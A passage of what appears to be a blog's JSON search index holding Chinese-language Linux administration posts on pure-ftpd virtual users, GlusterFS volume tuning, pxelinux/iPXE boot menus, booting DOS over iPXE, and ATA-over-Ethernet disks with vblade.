class=\"nv\"\u003eem_from\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e em_from + l\u003cspan class=\"o\"\u003e[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print \u003cspan class=\"s2\"\u003e\u0026#34;From: %s - Subject: %s\u0026#34;\u003c/span\u003e %\u003cspan class=\"o\"\u003e(\u003c/span\u003eem_from, subject\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print \u003cspan class=\"s2\"\u003e\u0026#34;-------------------------------------------------------------------------------------------------\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e mes.is_multipart\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003efor\u003c/span\u003e part in mes.get_payload\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                print  quopri.decodestring\u003cspan class=\"o\"\u003e(\u003c/span\u003epart.get_payload\u003cspan class=\"o\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            print quopri.decodestring\u003cspan class=\"o\"\u003e(\u003c/span\u003emes.get_payload\u003cspan class=\"o\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"mbox文件中的=3D是什么鬼(quoted-printable编码)"},{"content":"用过proftpd和vs-ftpd，proftpd有巨恐怖的sftp细粒度控制，特殊场合非常好。\n但是总觉得都很复杂，我们文件系统的底层是GlusterFS，在之上建立虚用户，用proftpd和vs-ftpd都感觉复杂。\n所以一直在找简单的方法，最后发现了pure-ftpd，很简单！！！\n首先建一个无任何登陆权的新用户，注意，uid必须在500以上，不能用系统缺省的用户ftp，后面改pure-ftpd.conf时会有说明：\nuseradd -u1000 -U -s/sbin/nologin -M ftpuser 安装pure-ftpd\nyum -y install pure-ftpd 修改配置：\nvi /etc/pure-ftpd/pure-ftpd.conf ChrootEveryone yes AnonymousOnly no NoAnonymous yes PureDB /etc/pure-ftpd/pureftpd.pdb #PAMAuthentication yes UnixAuthentication yes #注意，这里就指出了最小uid，所以第一步建立用户的时候uid不能小于500，否则pure-ftpd无法认证 MinUID 500 CreateHomeDir yes 改完后，我们来增加个用户，注意语法，test是虚拟用户名，-u和-g是虚拟用户对应linux系统的系统用户，就是我们第一步建立的那个无登陆权的ftpuser，-d是home目录，这个不用建，用户第一次登陆的时候pure-ftpd会自动建立：\npure-pw useradd test -u ftpuser -g ftpuser -d /var/www/ppp 重建hash\npure-pw mkdb 重启pure-ftpd\nservice restart pure-ftpd ok，搞定了，一定要注意uid的问题。其他无复杂的地方。\n","permalink":"https://rendoumi.com/posts/20240118-pure-ftpd/","summary":"\u003cp\u003e用过proftpd和vs-ftpd，proftpd有巨恐怖的sftp细粒度控制，特殊场合非常好。\u003c/p\u003e\n\u003cp\u003e但是总觉得都很复杂，我们文件系统的底层是GlusterFS，在之上建立虚用户，用proftpd和vs-ftpd都感觉复杂。\u003c/p\u003e\n\u003cp\u003e所以一直在找简单的方法，最后发现了pure-ftpd，很简单！！！\u003c/p\u003e\n\u003cp\u003e首先建一个无任何登陆权的新用户，注意，uid必须在500以上，不能用系统缺省的用户ftp，后面改pure-ftpd.conf时会有说明：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euseradd -u1000  -U -s/sbin/nologin -M ftpuser  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e安装pure-ftpd\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install pure-ftpd  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e修改配置：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/pure-ftpd/pure-ftpd.conf  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eChrootEveryone              yes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAnonymousOnly               no  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNoAnonymous                 yes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePureDB                      /etc/pure-ftpd/pureftpd.pdb  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#PAMAuthentication          yes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUnixAuthentication          yes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#注意，这里就指出了最小uid，所以第一步建立用户的时候uid不能小于500，否则pure-ftpd无法认证\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eMinUID                      \u003cspan class=\"m\"\u003e500\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCreateHomeDir               yes  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e改完后，我们来增加个用户，注意语法，test是虚拟用户名，-u和-g是虚拟用户对应linux系统的系统用户，就是我们第一步建立的那个无登陆权的ftpuser，-d是home目录，这个不用建，用户第一次登陆的时候pure-ftpd会自动建立：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epure-pw useradd \u003cspan class=\"nb\"\u003etest\u003c/span\u003e -u ftpuser -g ftpuser -d /var/www/ppp  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e重建hash\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epure-pw mkdb  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e重启pure-ftpd\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservice restart pure-ftpd  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eok，搞定了，一定要注意uid的问题。其他无复杂的地方。\u003c/p\u003e","title":"Linux下virtual FTP的搭建pure-ftpd"},{"content":"基本上搭建glusterfs都是用了2个副本，用来保证数据冗余\n建立新卷，/export/test-vol目录不用事先建立，会自动建立的：\ngluster volume create test-vol replica 2 transport tcp 172.16.8.5:/export/test-vol/ 172.16.8.6:/export/test-vol/ 如上建立新卷后，test-vol的属主是root，如果我们想基于gfs之上做个虚拟的vsftpd，建设用户是virtual.virtual，500.500\n设置卷uid/gid属性：\ngluster volume set test-vol storage.owner-uid 500 gluster volume set test-vol storage.owner-gid 500 设置卷的quota空间配额：\ngluster volume quota test-vol enable gluster volume quota test-vol limit-usage / 10GB gluster volume quota test-vol limit-usage /path/in/volume 2G gluster volume set test-vol features.quota-timeout 30 gluster volume quota test-vol list gluster volume quota test-vol list /path/in/volume 去掉quota限制：\ngluster volume quota test-vol remove / gluster volume quota test-Vol remove /path/in/volume 优化tcp参数：\ngluster volume set test-vol diagnostics.brick-log-level WARNING gluster volume set test-vol diagnostics.client-log-level WARNING gluster volume set test-vol nfs.enable-ino32 on gluster volume set test-vol nfs.addr-namelookup off gluster volume set test-vol nfs.disable on gluster volume set test-vol performance.cache-max-file-size 2MB gluster volume set test-vol performance.cache-refresh-timeout 4 gluster volume set test-vol performance.cache-size 256MB gluster volume set test-vol performance.write-behind-window-size 4M gluster volume set test-vol performance.io-thread-count 32 设置卷访问权限\ngluster volume set test-vol auth.allow 192.168.2.* gluster volume set test-vol auth.reject 192.168.2.* 监控\ngluster volume profile zfws-vol start gluster volume profile zfws-vol info ","permalink":"https://rendoumi.com/posts/20240118-gfs/","summary":"\u003cp\u003e基本上搭建\u003ccode\u003eglusterfs\u003c/code\u003e都是用了2个副本，用来保证数据冗余\u003c/p\u003e\n\u003cp\u003e建立新卷，/export/test-vol目录不用事先建立，会自动建立的：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume create test-vol replica \u003cspan class=\"m\"\u003e2\u003c/span\u003e transport tcp 172.16.8.5:/export/test-vol/ 172.16.8.6:/export/test-vol/  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如上建立新卷后，test-vol的属主是root，如果我们想基于gfs之上做个虚拟的vsftpd，建设用户是virtual.virtual，500.500\u003c/p\u003e\n\u003cp\u003e设置卷uid/gid属性：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol storage.owner-uid \u003cspan class=\"m\"\u003e500\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol storage.owner-gid \u003cspan class=\"m\"\u003e500\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e设置卷的quota空间配额：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-vol \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-vol limit-usage / 10GB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-vol limit-usage /path/in/volume 2G  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol features.quota-timeout \u003cspan class=\"m\"\u003e30\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-vol list  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-vol list /path/in/volume  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e去掉quota限制：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-vol remove /  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-Vol remove /path/in/volume  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e优化tcp参数：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol diagnostics.brick-log-level WARNING  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol diagnostics.client-log-level WARNING  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol nfs.enable-ino32 on  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol nfs.addr-namelookup off  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol nfs.disable on  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol performance.cache-max-file-size 2MB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol performance.cache-refresh-timeout \u003cspan class=\"m\"\u003e4\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol performance.cache-size 256MB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol performance.write-behind-window-size 4M  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e test-vol performance.io-thread-count \u003cspan class=\"m\"\u003e32\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e设置卷访问权限\u003c/p\u003e","title":"GlusterFS的日常应用"},{"content":"在做pxelinux启动的过程中，不可避免的会用到菜单选项。有两个选择，menu.c32 和 vesamenu.c32。\n效果如下： menu.c32 vesamenu.c32 区别就是一个地方，我们看一下配置文件：\ndefault vesamenu.c32 PROMPT 0 NOESCAPE 0 ALLOWOPTIONS 0 TIMEOUT 200 MENU TITLE Boot Menu LABEL Ghost_Client_UNDI MENU LABEL ^1. Ghost Client UNDI MENU DEFAULT kernel memdisk append keeppxe initrd=imz/Client_undi.imz LABEL Ghost_Client_NDIS MENU LABEL ^2. Ghost Client NDIS kernel memdisk APPEND keeppxe initrd=imz/Client_ndis.IMZ LABEL WinPE MENU LABEL ^3. WinPE 2.0 KERNEL boot/pxeboot.0 LABEL PartedMagic MENU LABEL ^4. Parted Magic kernel utils/pmagic/bzImage LABEL Local_Drive MENU LABEL ^5. Boot Local Drive # localboot 0 KERNEL chain.c32 APPEND hd0 0 区别就是第一行:\nmenu.c32 是 UI menu.c32\nvesamenu.c32 是 default vesamenu.c32\n个人还是觉得menu.c32比较好，习惯了这种蓝色。\n那么，我们如果想把pxelinux.0、menu.c32、vesamenu.c32都扔到/ks/pxelinux的子目录下，而不是扔在/ks的根目录下，那么配一下dnsmasq的209和210即可，看一下boot2.php文件：\ncase \u0026#39;\\52:54:00:7f:65:bb\u0026#39;: echo \u0026#34;set 209:string vesamenu.conf\\n\u0026#34;; echo \u0026#34;set 210:string http://172.16.8.1/ks/pxelinux/\\n\u0026#34;; echo \u0026#34;chain http://172.16.8.1/ks/pxelinux/pxelinux.0\\n\u0026#34;; break; ","permalink":"https://rendoumi.com/posts/20240118-ipxe_menu/","summary":"\u003cp\u003e在做pxelinux启动的过程中，不可避免的会用到菜单选项。有两个选择，menu.c32 和 vesamenu.c32。\u003c/p\u003e\n\u003cp\u003e效果如下： menu.c32\n\u003cimg alt=\"image-20240118172119725\" loading=\"lazy\" src=\"/posts/20240118-ipxe_menu/image-20240118172119725.png\"\u003e\u003c/p\u003e\n\u003cp\u003evesamenu.c32\n\u003cimg alt=\"image-20240118172137015\" loading=\"lazy\" src=\"/posts/20240118-ipxe_menu/image-20240118172137015.png\"\u003e\u003c/p\u003e\n\u003cp\u003e区别就是一个地方，我们看一下配置文件：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefault vesamenu.c32  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePROMPT \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNOESCAPE \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eALLOWOPTIONS \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTIMEOUT \u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eMENU TITLE Boot Menu\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLABEL Ghost_Client_UNDI  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  MENU LABEL ^1. Ghost Client UNDI\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  MENU DEFAULT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  kernel memdisk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  append keeppxe \u003cspan class=\"nv\"\u003einitrd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eimz/Client_undi.imz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLABEL Ghost_Client_NDIS  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  MENU LABEL ^2. Ghost Client NDIS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  kernel memdisk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  APPEND keeppxe \u003cspan class=\"nv\"\u003einitrd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eimz/Client_ndis.IMZ\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLABEL WinPE  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  MENU LABEL ^3. WinPE 2.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  KERNEL boot/pxeboot.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLABEL PartedMagic  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  MENU LABEL ^4. Parted Magic\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  kernel utils/pmagic/bzImage\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLABEL Local_Drive  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e MENU LABEL ^5. Boot Local Drive\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"c1\"\u003e#  localboot 0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e KERNEL chain.c32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e APPEND hd0 \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e区别就是第一行:\u003c/p\u003e","title":"ipxe中menu.c32和vesamenu.c32的用法"},{"content":"太古老的命题了，如果想玩Dos 6.22之下的游戏，那就需要引动一个Dos系统了。\n系统文件倒是现成的，Dos6.22.img。\n如何做个ipxe的启动呢？\n简单，依样画葫芦，修改boot2.php\ncase \u0026#39;\\52:54:00:7f:65:bb\u0026#39;: echo \u0026#34;initrd http://172.16.8.1/ks/dos/Dos6.22.img\\n\u0026#34;; echo \u0026#34;chain http://172.16.8.1/ks/dos/memdisk\\n\u0026#34;; break; memdisk是从syslinux中拷贝的，也是神器。\n其实可以用sanboot来启动的，但是那样起动起来的系统对C盘无写权限，因为dos下没有san的驱动可用。\n所以改用memdisk，这样权限变为可写的了。\n","permalink":"https://rendoumi.com/posts/20240118-ipxe_dos/","summary":"\u003cp\u003e太古老的命题了，如果想玩Dos 6.22之下的游戏，那就需要引动一个Dos系统了。\u003c/p\u003e\n\u003cp\u003e系统文件倒是现成的，Dos6.22.img。\u003c/p\u003e\n\u003cp\u003e如何做个ipxe的启动呢？\u003c/p\u003e\n\u003cp\u003e简单，依样画葫芦，修改boot2.php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\52:54:00:7f:65:bb\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;initrd http://172.16.8.1/ks/dos/Dos6.22.img\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;chain http://172.16.8.1/ks/dos/memdisk\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ememdisk是从syslinux中拷贝的，也是神器。\u003c/p\u003e\n\u003cp\u003e其实可以用sanboot来启动的，但是那样起动起来的系统对C盘无写权限，因为dos下没有san的驱动可用。\u003c/p\u003e\n\u003cp\u003e所以改用memdisk，这样权限变为可写的了。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240118171412093\" loading=\"lazy\" src=\"/posts/20240118-ipxe_dos/image-20240118171412093.png\"\u003e\u003c/p\u003e","title":"ipxe启动Dos 6.22"},{"content":"先普及一下，aoe（ata over ethernet），跟iscsi差不多，不过是硬盘协议走在了以太网上。iscsi是3层的协议，aoe是二层的协议。\n因为是二层的，所以没有网关、路由等等，相对强制的，客户端和服务器端必须是位于同一子网内。\n先装服务端vblade：\nyum install vblade 然后准备存储空间，像lv、raw文件、硬盘(/dev/sdb)、硬盘分区(/dev/sdb1)或者raid磁盘/dev/md0都可以用作储存。\n做一块20G的raw文件存储空间：\nmkdir /storage dd if=/dev/zero of=/storage/storage1.img bs=1024k count=20000 做一块aoe硬盘：\nvbladed 65535 255 eth0 /storage/storage1.img 解释一下 vbladed 后面跟了2个数字，第一个是主序列号，可以从 0-65535，第二个是次序列号，可以从0-255。然后跟发布的网卡，最后是存储空间。\n最好把vbladed放入/etc/rc.d/rc.local\nvi /etc/rc.local vbladed 65535 255 eth0 /storage/storage1.img ok，服务器端的工作就完成了，大家看到了，基本什么也没设，因为是走在二层么。\n然后ipxe部分就简单了，依样画葫芦修改boot2.php：\ncase \u0026#39;\\52:54:00:d9:fe:43\u0026#39;: echo \u0026#34;set keep-san 1\\n\u0026#34;; echo \u0026#34;sanboot aoe:e65535.255\\n\u0026#34;; break; 搞定\n","permalink":"https://rendoumi.com/posts/20240118-ipxe_aoe/","summary":"\u003cp\u003e先普及一下，aoe（ata over ethernet），跟iscsi差不多，不过是硬盘协议走在了以太网上。iscsi是3层的协议，aoe是二层的协议。\u003c/p\u003e\n\u003cp\u003e因为是二层的，所以没有网关、路由等等，相对强制的，客户端和服务器端必须是位于同一子网内。\u003c/p\u003e\n\u003cp\u003e先装服务端vblade：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install vblade  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后准备存储空间，像lv、raw文件、硬盘(/dev/sdb)、硬盘分区(/dev/sdb1)或者raid磁盘/dev/md0都可以用作储存。\u003c/p\u003e\n\u003cp\u003e做一块20G的raw文件存储空间：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /storage  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan 